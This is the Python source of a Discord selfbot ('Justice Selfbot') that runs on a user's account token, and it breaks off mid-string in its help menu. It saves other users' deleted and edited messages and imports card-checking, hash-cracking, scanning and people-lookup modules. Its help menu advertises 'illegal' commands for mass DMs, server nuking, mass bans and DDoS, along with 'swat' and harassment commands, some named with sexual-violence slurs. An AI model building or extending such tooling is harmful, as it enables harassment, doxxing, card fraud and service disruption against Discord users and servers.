import datetime
import discord
import aiohttp
from datetime import datetime
import psutil
import datetime
import traceback
import pytz
import urllib.parse
import websockets
import platform
import tempfile
from datetime import timedelta
import datetime
from concurrent.futures import ThreadPoolExecutor
import socket
import speedtest as Speedtest
from collections import defaultdict
import requests
import asyncio
from gtts import gTTS
import uuid
import time
import threading
from threading import Thread
import json
import re
import os
import sys
import subprocess
import random
import io
import typing 
from dateutil import parser
from pypresence import Presence
from googletrans import Translator, LANGUAGES
from dhooks import Webhook
from discord.ext import commands
from colorama import init, Fore, Style
# Core modules
from core.utils.logging import success, error, warning, inpt, info
from core.utils.init import config
# Other modules
from core.other.ccchecker import Checker
from core.other.cryptolookup import Cryptolookup
from core.other.hashcracker import hashcracker
from core.other.cvesearcher import FindCVE_NVD_NIST
from core.other.defaultrouter import router
from core.other.maclookup import maclookup
from core.other.userdb import userdb
from core.other.csvdbreader import csvdbreader
# IP modules
from core.ip.iplookup import IpLookup
from core.ip.ipfraud import IpFraud
from core.ip.isproxy import isproxy
from core.ip.portscanner import portscan
from core.ip.getserverbanner import getbanner
from core.ip.isup import isup
from core.ip.networkdeviceenum import netenum
# Minecraft modules
from core.minecraft.usernametoid import UsernameToId
from core.minecraft.capeandskin import CapeAndSkin
from core.minecraft.isblockedserver import IsBlocked
from core.minecraft.serverlookup import MCServerLookup
from core.minecraft.hypixellookup import hypixel_lookup
# Discord modules
from core.discord.idlookup import IdLookup
from core.discord.discordinvinfo import DiscordInvInfo
from core.discord.discordwebhookinfo import WebhookInfo
# Domain modules
from core.domain.subdomainenum import SubdomainEnum
from core.domain.topleveldomainenum import TopLevelDomainEnum
from core.domain.directoryenum import DirectoryEnum
# Location modules
from core.location.ziptolocation import ZIPtoLocation
from core.location.locationtozip import LocationtoZIP
from core.location.citystatetozip import CitystateToZIP
# Identity modules
from core.identity.phonenumber import Phonenumber
from core.identity.usernamelookup import UserLookup
from core.identity.email import email_lookup
from core.identity.peoplelookup import PeopleLookup


init(autoreset=True)


print(Fore.RED + """               
                        ╦╦ ╦╔═╗╔╦╗╦╔═╗╔═╗  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
                        ║║ ║╚═╗ ║ ║║  ║╣   ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║ 
                       ╚╝╚═╝╚═╝ ╩ ╩╚═╝╚═╝  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩ 
                                  Async Development                                                                  """)
help_message = None
help_author = None
help_expiry = None
status_changing_task = None
CONFIG_FILE = 'config.json'

def load_config():
    if not os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, 'w') as f:
            json.dump({}, f, indent=4)

    with open(CONFIG_FILE, 'r') as f:
        return json.load(f)

# Save only the token key
def save_token(token, config):
    config['token'] = token
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=4)

# Ask for token input
def get_token_from_user(config):
    token = input("Enter your user token: ").strip()
    save_token(token, config)
    print("✅ Token saved. Please restart the bot.")
    sys.exit()
def errorselfbot():
    with open('config.json') as f:
        global token
        token = token
    
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }
    return headers

intents = discord.Intents.default()
intents.members = True
intents.reactions = True
intents.messages = True

client = commands.Bot(command_prefix='>', intents=intents, self_bot=True)
client.help_command = None


def load_afk_users():
    try:
        with open('afk.json', 'r') as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def save_afk_users(afk_users):
    with open('afk.json', 'w') as f:
        json.dump(afk_users, f)

def initialize_rotate_commands(client):
    print("Initializing rotate commands...")

@client.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        try:
            await ctx.message.delete()
            await ctx.send("`Wrong Command/Usage !!`")
        except:
            pass

@client.event
async def on_ready():
    print("SelfBot Is Online")
    print("------------------------")
    print("Prefix is >")
    load_autopress()

    
    rpc_states = [
    discord.Activity(
        type=discord.ActivityType.streaming, 
        name="Jxstice Selfbot 🥀", 
        url="https://www.twitch.tv/syntax"
    ),
    discord.Activity(
        type=discord.ActivityType.streaming, 
        name="MaDe By Syntax X Error 🍷",
        url="https://www.twitch.tv/syntax"
        
    ),
    discord.Activity(
        type=discord.ActivityType.streaming, 
        name="Syntax X Error X Maaz X Master",
        url="https://www.twitch.tv/syntax"
        
    )
]

    async def rotate_rpc():
        while True:
            for activity in rpc_states:
                await client.change_presence(
                    status=discord.Status.dnd, 
                    activity=activity
                )
                await asyncio.sleep(45)  

 
    client.loop.create_task(rotate_rpc())

    



client.help_command = None
client.remove_command("help")
client.msgsniper = True
client.sniped_message_dict = {}
client.sniped_edited_message_dict = {}
client.snipe_history_dict = {}

@client.event
async def on_message(message):
    if message.author == client.user and message.content.startswith('.'):
        return

    if help_message and message.author == help_author and help_expiry and help_expiry > asyncio.get_event_loop().time():
        content = message.content.lower()

        if content.startswith('p') and content[1:].isdigit():
            page = int(content[1:]) 

            if 1 <= page <= len(pages):
                await help_message.edit(content=pages[page - 1] + f"```ansi\n              {www}Page {page}/{len(pages)} - Type {red}p#{www} to navigate.```")

                try:
                    await message.delete()
                except:
                    pass

 

    for user_id, emoji in autoreact_users.items():
        if message.author.id == user_id:
            try:
                await message.add_reaction(emoji)
            except Exception as e:
                print(e)

    for user_id, data in dreact_users.items():
        if message.author.id == user_id:
            emojis = data[0]
            current_index = data[1]
            try:
                await message.add_reaction(emojis[current_index])
                data[1] = (current_index + 1) % len(emojis)
            except Exception as e:
                print(e)


    if force_delete_users[message.author.id]:
        try:
            await message.delete()
        except:
            pass

    if message.author.bot:
        return
    for user_id in afk_users:
        if str(user_id) in [str(mention.id) for mention in message.mentions]:
            reason = afk_users[user_id]
            await message.channel.send(f"{message.author.mention} {message.author.name}, I am AFK. Reason: {reason if reason else 'No reason provided.'}")
            print("GOT MENTIONED WHILE AFK")
            return
    if message.author.id in dreact_users:
        emoji_data = dreact_users[message.author.id]
        emojis, current_index = emoji_data[0], emoji_data[1]
        try:
            await message.add_reaction(emojis[current_index])
            dreact_users[message.author.id][1] = (current_index + 1) % len(emojis)
        except Exception as e:
            print(f"Error adding dreact reaction: {str(e)}")
    if message.author.id in autoreact_users:
        emoji = autoreact_users[message.author.id]
        try:
            await message.add_reaction(emoji)
        except Exception as e:
            print(f"Error adding autoreact reaction: {str(e)}")
    if message.author.bot or message.author != client.user:
        return
    with open('ar.json', 'r') as file:
        auto_responses = json.load(file)
    if message.content in auto_responses:
        await message.channel.send(auto_responses[message.content])
    await client.process_commands(message)

@client.event
async def on_message_delete(message):
    if message.author.id == client.user.id:
        return
    if client.msgsniper:
        if isinstance(message.channel, discord.DMChannel):
            attachments = message.attachments
            if len(attachments) == 0:
                message_content = "``" + str(discord.utils.escape_markdown(str(message.author))) + "``: " + str(
                    message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await message.channel.send(message_content)
            else:
                links = "ERROR - "
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "``" + str(
                    discord.utils.escape_markdown(str(message.author))) + "``: " + discord.utils.escape_mentions(
                    message.content) + "\n\n**Attachments:**\n" + links
                await message.channel.send(message_content)
    if len(client.sniped_message_dict) > 1000:
        client.sniped_message_dict.clear()
    if len(client.snipe_history_dict) > 1000:
        client.snipe_history_dict.clear()
    attachments = message.attachments
    if len(attachments) == 0:
        channel_id = message.channel.id
        message_content = "``" + str(discord.utils.escape_markdown(str(message.author))) + "``: " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        client.sniped_message_dict.update({channel_id: message_content})
        if channel_id in client.snipe_history_dict:
            pre = client.snipe_history_dict[channel_id]
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            client.snipe_history_dict.update({channel_id: pre[:-3] + post + "\n```"})
        else:
            post = str(message.author) + ": " + str(message.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
            client.snipe_history_dict.update({channel_id: "```\n" + post + "\n```"})
    else:
        links = "ERROR - "
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = message.channel.id
        message_content = "``" + str(discord.utils.escape_markdown(str(message.author))) + "``: " + discord.utils.escape_mentions(message.content) + "\n\n**Attachments:**\n" + links
        client.sniped_message_dict.update({channel_id: message_content})

@client.event
async def on_message_edit(before, after):
    if before.author.id == client.user.id:
        return
    if client.msgsniper:
        if before.content is after.content:
            return
        if isinstance(before.channel, discord.DMChannel) or isinstance(before.channel, discord.GroupChannel):
            attachments = before.attachments
            if len(attachments) == 0:
                message_content = "``" + str(
                    discord.utils.escape_markdown(str(before.author))) + "``: \n**BEFORE**\n" + str(
                    before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                                    "@\u200bhere") + "\n**AFTER**\n" + str(
                    after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
                await before.channel.send(message_content)
            else:
                links = "ERROR - "
                for attachment in attachments:
                    links += attachment.proxy_url + "\n"
                message_content = "``" + str(
                    discord.utils.escape_markdown(str(before.author))) + "``: " + discord.utils.escape_mentions(
                    before.content) + "\n\n**Attachments:**\n" + links
                await before.channel.send(message_content)
    if len(client.sniped_edited_message_dict) > 1000:
        client.sniped_edited_message_dict.clear()
    attachments = before.attachments
    if len(attachments) == 0:
        channel_id = before.channel.id
        message_content = "``" + str(discord.utils.escape_markdown(str(before.author))) + "``: \n**BEFORE**\n" + str(
            before.content).replace("@everyone", "@\u200beveryone").replace("@here",
                                                                            "@\u200bhere") + "\n**AFTER**\n" + str(
            after.content).replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
        client.sniped_edited_message_dict.update({channel_id: message_content})
    else:
        links = "ERROR - "
        for attachment in attachments:
            links += attachment.proxy_url + "\n"
        channel_id = before.channel.id
        message_content = "`" + str(
            discord.utils.escape_markdown(str(before.author))) + "``: " + discord.utils.escape_mentions(
            before.content) + "\n\n**Attachments:**\n" + links
        client.sniped_edited_message_dict.update({channel_id: message_content})
www = Fore.WHITE
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
pages = [
    f"""```ansi
[31m⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣋⣀⣀⣀⢀⣀⣀⣀⠀⠀⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢾⡤⠤⠤⢤⡤
⣿⣿⣿⠿⠟⠉⠉⠀⣹⣿⣋⣻⣿⡇⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠀⠀⠀⠀⠀
⠈⠉⠀⠀⠀⠀⠀⣴⡿⠁⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠘⣿⠿⠀⠀⠀⠀⠀⠀⠀[0m
``````js
< Justice > = Made By Syntax X Error
``````js
[01]autoreaction <emoji> <mention>
[02]reactionoff <mention>
[03]mimic <mention>
[04]antigc
[05]autopressure <mention>
[06]stoppressure
[07]spam <amount> <msg>
[08]ban [user]
[09]unban [user]
[10]mute [user]
[11]unmute [user]
[12]insult [user]
```""",
        f"""```ansi
[32m⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣤⠾⠄⠼⠦⠤⠤⠤⠤⠤⠦⠶⠶⠶⠶⠤⠤⠤⢤⡀⣀⣀⣀⣀⣀⠀⠀⠀
⢀⣤⣤⣤⣤⣤⣤⡟⠉⡉⠉⠉⣉⠉⠉⢹⠀⠤⠤⠀⠀⡟⠛⠛⠛⠛⠛⠻⡏⠩⠭⠍⢹⣿⣿⣹
⢸⠀⡠⠤⡤⠤⢼⡁⠀⠉⠉⠉⠁⠀⠀⢠⣧⠒⠒⠒⢲⡷⠶⠶⠶⠶⠶⠾⡇⠛⠛⠛⢺⡷⠶⠶
⢸⠀⣷⣺⡧⠶⠛⠛⢶⡒⠒⠒⢲⢶⡶⠶⣷⠖⠒⠒⢾⠁⠀⠀⠀⠀⠀⠀⠉⠉⣏⡿⠉⠀⠀⠀
⢸⠀⡯⠁⠀⠀⠀⠀⣰⢫⣶⡄⡾⠦⣥⣤⣿⡆⠀⢠⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣤⡇⠀⠀⠀⠀⣰⣯⣿⡿⣸⠁⠀⠀⠀⠈⡇⢠⠘⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⠏⣙⠿⢣⡇⠀⠀⠀⠀⠀⣷⠈⠀⠆⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠙⠲⢵⠟⠀⠀⠀⠀⠀⠀⢸⡆⣡⣴⠼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````js
"𒀱"             GENERAL COMMANDS 
``````js
[01]justice
[02]ping
[03]userinfo
[04]pfp
[05]banner
[06]serverinfo
[07]balance [address]
[08]ltc
[09]purge
[10]icon
```""",
        f"""```ansi
[33m⠀⠀⣠⡶⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣯⠀⠀⠀⠀⠀⠀⢠⣴⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀
⢼⣿⣿⣆⠀⢀⣀⣀⣴⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⠿⠿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢻⣿⠋⠙⢿⣿⣿⡀⠀⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠿⢆⣀⣼⣿⣿⣿⣿⡏⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡀⣨⡙⠟⣩⣙⣡⣬⣴⣤⠏⠀⠀⠀⠀⠀⠀⣀⡀
⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⣀⣤⣾⣿⣿⡇
⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣇⠀⢸⣿⣿⠿⠿⠛⠃
⠀⠀⠀⠀⢠⣿⣿⢹⣿⢹⣿⣿⣿⢰⣿⠿⠃⠀⠀⠀⠀
⠀⢀⣀⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡛⠀⠀⠀⠀⠀⠀
⠀⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠛⠓⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠀⠉⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````js
"𒀱"             ACTIVITY COMMANDS
``````js
[01]listen [message]
[02]play   [message]
[03]stream [message]
[04]removestatus
[05]rotate [emoji][msg] / [emoji][msg] / [repeat again] 
[06]stoprotator
```""",
        f"""```ansi
[36m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡴⣆⠀⠀⠀⠀⠀⣠⡀⠀⠀⠀⠀⠀⠀⣼⣿⡗⠀⠀⠀⠀
⠀⠀⠀⣠⠟⠀⠘⠷⠶⠶⠶⠾⠉⢳⡄⠀⠀⠀⠀⠀⣧⣿⠀⠀⠀⠀⠀
⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣤⣤⣤⣤⣤⣿⢿⣄⠀⠀⠀⠀
⠀⠀⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣧⠀⠀⠀⠀⠀⠀⠙⣷⡴⠶⣦
⠀⠀⢱⡀⠀⠉⠉⠀⠀⠀⠀⠛⠃⠀⢠⡟⠂⠀⠀⢀⣀⣠⣤⠿⠞⠛⠋
⣠⠾⠋⠙⣶⣤⣤⣤⣤⣤⣀⣠⣤⣾⣿⠴⠶⠚⠋⠉⠁⠀⠀⠀⠀⠀⠀
⠛⠒⠛⠉⠉⠀⠀⠀⣴⠟⣣⡴⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````js
"𒀱"             UTILITY COMMANDS
``````js
[01]afk [reason]
[02]unafk
[03]hide
[04]unhide
[05]lock
[06]unlock
[07]weather [city]
[08]checkpromo [promo]
[09]checktoken [token]
[10]ltcbal [addy]
[11]ar [trigger], [response]
[12]removear [response]
[13]hjoin
```""",
        f"""```ansi
[34m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠄⢤⣠⢷⣝⢦⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠒⣲⣦⣺⣳⣤⡿⠛⠃⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠉⠢⣣⣁⠀⣀⠙⢧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⡎⠑⢤⡼⡩⡪⠷⠀⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣶⡞⢯⣠⡻⠼⡇⠀⠀⠀⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡷⢌⠻⣶⡟⡄⠈⠁⠀⠀⠐⢣⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡴⣷⣿⡗⠀⣡⠊⠻⠋⠒⢄⠀⠀⢀⠔⠙⢦⡀⠀
⠀⠀⠀⠀⠀⠀⡠⠊⠁⢺⣿⢇⠜⠁⠀⠀⠀⠀⣠⠗⠊⠀⠀⣠⡺⠆⠀
⠀⠀⠀⠀⣠⣾⡗⠀⠀⢸⡿⠋⠀⠀⠀⠀⠀⠀⠻⣆⠛⣠⣞⢕⢽⣆⠀
⠀⠀⠀⣴⣿⣿⡇⠀⢀⠞⠁⠀⠀⠀⠀⠀⠀⠀⢐⡯⡪⡫⡢⣑⣕⢕⠀
⠀⠀⣼⣿⣿⣿⠇⡰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢮⡺⣾⣮⡪⡳⠀
⢀⣼⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠺⣷⣝⢮⠀
⠾⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⣻⡇[0m
``````js
"𒀱"             ILLEGAL COMMANDS
``````js
[01]hook [user] [message]
[02]dmall [message]
[03]wizz
[04]prune
[05]massban
[06]clone [old server id] [new server id]
[07]lockserver
[08]unlockserver
[09]ddos [method] [url/ip]
```""",
        f"""```ansi
[35m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠤⠒⠈⠉⠉⠉⠉⠒⠀⠀⠤⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⢀⣄⠀⠀⠀⠀⠑⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠰⠿⠿⠿⠣⣶⣿⡏⣶⣿⣿⠷⠶⠆⠀⠀⠘⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠠⠴⡅⠀⠀⠠⢶⣿⣿⣷⡄⣀⡀⡀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀
⠀⣰⡶⣦⠀⠀⠀⡰⠀⠀⠸⠟⢸⣿⣿⣷⡆⠢⣉⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣧⣿⣇⠀⠀⡇⠀⢠⣷⣲⣺⣿⣿⣇⠤⣤⣿⣿⠀⢸⠀⣤⣶⠦⠀⠀⠀⠀
⠀⠀⠙⢿⣿⣦⡀⢇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⡜⣾⣿⡃⠇⢀⣤⡀⠀
⠀⠀⠀⠀⠙⢿⣿⣮⡆⠀⠙⠿⣿⣿⣾⣿⡿⡿⠋⢀⠞⢀⣿⣿⣿⣿⣿⡟⠁⠀
⠀⠀⠀⠀⠀⠀⠛⢿⠇⣶⣤⣄⢀⣰⣷⣶⣿⠁⡰⢃⣴⣿⡿⢋⠏⠉⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⢾⣿⣿⣿⣞⠿⣿⣿⢿⢸⣷⣌⠛⠋⠀⠘⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠙⣿⣿⣿⣶⣶⣿⣯⣿⣿⣿⣆⠀⠇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣯⡙⢿⣿⣿⠟⡁⠰⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⡟⠈⢩⣥⣾⣷⠐⡌⠙⠃⠀[0m
``````js
"𒀱"             EMOTE COMMANDS
``````js
[01]kiss
[02]hug
[03]wave
[04]smile
[05]kill
[06]cry
[07]blush
[08]bully
[09]slap
[10]handhold
```""",
        f"""```ansi
[31m⠀⠀⠀⠲⣦⣤⣀⣀⠀⠀⠀⣀⣀⣠⣤⣀⣀⠀⢀⣀⣠⣤⣶⣶⠟⠀⠀⠀
⠀⠀⠀⠀⠙⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⠟⢻⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠲⣶⣶⣾⣿⣿⠀⢨⠙⢿⣿⣿⠏⣅⠀⢸⣿⣿⣷⣾⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⢷⣶⣶⣾⣿⣿⣶⣶⣾⠟⣿⣿⣿⣋⠀⠀⠀⠀⠀
⠀⠀⢀⣀⣀⠐⢶⣿⣿⣧⠁⠀⠋⠁⠈⠋⠀⢀⣾⣿⣿⡿⣷⣶⠀⠀⠀⠀
⠀⠀⣼⣿⣿⣷⣤⣙⣿⣿⣷⣶⣶⣴⣴⣴⣶⣿⣿⣿⠟⣡⣿⣿⣧⣄⣀⡀
⢀⣤⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⡿⠿⣿⣿⣿⣿
⣿⡿⠛⠿⠟⠉⠉⠉⠸⠋⠀⠻⡿⣿⣿⣿⣿⠻⠇⠀⠀⠈⠀⠀⠈⠉⢸⠃
⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠈⢿⢻⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````js
"𒀱"             PACKING COMMANDS
``````js
[01]autopressure <mention>
[02]stoppressure <mention>
[03]autoreply <mention>
[04]autoreplyoff <mention>
[05]spit
[06]stomp
[07]bangmom
[08]rape
```""",
        f"""```ansi
[35m⠀⠀⢀⠔⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠈⠑⢮⡳⡀⠀⠀
⠀⡴⠁⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⣄⠙⠺⣄⠀
⡰⠀⠀⠀⢠⡇⠀⠀⡟⠀⠀⢰⡆⠀⠀⠀⠀⠀⠀⠀⢸⣇⠀⣧⠀⢸⡆⠀⣈⣷
⠁⠀⠀⠀⣼⡇⠀⢰⡇⠀⠀⣸⣇⣼⠀⠀⠀⠀⠀⣀⣸⢻⠀⢹⠀⢸⣿⠀⢸⢹
⠀⠀⠀⠀⣿⠁⣀⣸⣷⠤⠖⣿⢿⡟⡇⠀⠀⠀⠀⢈⡟⢹⣷⣾⣇⠀⢿⠀⢸⠈
⠀⠀⠀⢸⣿⣀⣩⠼⠘⠖⠒⠛⠘⠧⠹⠶⠶⠶⠶⠞⠀⠈⣿⠋⣟⣙⣿⠀⢸⠀
⠀⠀⠀⠘⡇⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢹⠀⣸⠀
⠀⠀⡆⠀⣧⢀⣀⣐⣭⣭⣭⣭⣭⣵⠀⠀⠀⠀⠀⠠⣮⣍⣙⣒⡂⠀⣼⠀⣿⠀
⡀⠀⢻⡄⣹⡛⠛⠛⠛⠋⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠻⠟⣿⠀⡿⠄
⡇⠀⠀⢻⣌⣧⡀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⢻⠀⣷⠀
⣷⡀⠀⠀⢻⣏⠳⠄⠀⠀⠀⢰⠋⠁⠈⠉⠉⠉⠉⡷⠀⠀⠀⠀⠀⢀⣿⠀⣿⠀
⣿⢧⠀⠀⠀⢻⣦⡀⠀⠀⠀⠹⣄⡀⠀⠀⠀⢀⡼⠁⠀⠀⠀⢀⣤⣾⠏⢀⡿⠀
⣿⡌⢧⡀⠀⠈⣿⣝⣷⢶⣤⣀⣀⣉⣉⣛⣛⣉⣀⣤⣤⠶⠛⣩⣠⠋⢀⣾⠁⠀
⠈⠙⢮⣷⣄⢀⡟⠁⠀⠛⢧⣀⣈⠉⣉⠝⠉⠉⢿⣎⠀⠀⢰⣿⠀⣠⠿⠁⠀⠀
⠀⢀⣠⠴⠟⠛⠛⢆⡀⠀⠀⢈⡏⠿⠑⣄⣀⢀⡼⠷⠶⠛⠛⢿⡴⠋⠀⠀⠀⠀[0m
``````js
"𒀱"             FUN COMMANDS
``````js
[01]chatgpt [query]
[02]imagine [query]
[03]tts
[04]aura
[05]hack
[06]pp
[07]gay
[08]stats
[09]dripcheck
[10]discordreport
[11]nitro [user]
[12]swat [user]
[13]lOl [user]
[12]lm [msg1] [msg2] [msg3]..
```""",
        f"""```ansi
[35m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⢀⣠⣤⣤⡸⣿⣿⣿⣿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⢣⣴⣿⣿⣿⣿⣷⠈⠙⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣯⢿⣿⣿⡿⢿⣿⣇⠀⠀⠀⠀⣀⣀⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡏⣿⣿⣿⣞⣋⣁⣀⣿⣿⣿⣦⡀⠀⣾⣿⣿⣿⡆
⠀⣀⣀⣀⣀⣀⣀⣴⣾⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣿⣿⣿⣿⡏
⠐⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠻⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⣿⣿⣿⠿⠿⠛⠀
⠀⠀⠀⠉⠉⠉⠉⠉⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀[0m
``````js
"𒀱"             NSFW COMMANDS
``````js
[01]gif
[02]boobs
[03]hboobs
[04]anal
[05]hanal
[06]caughtin4k
[07]phcomment
```""",
        f"""```ansi
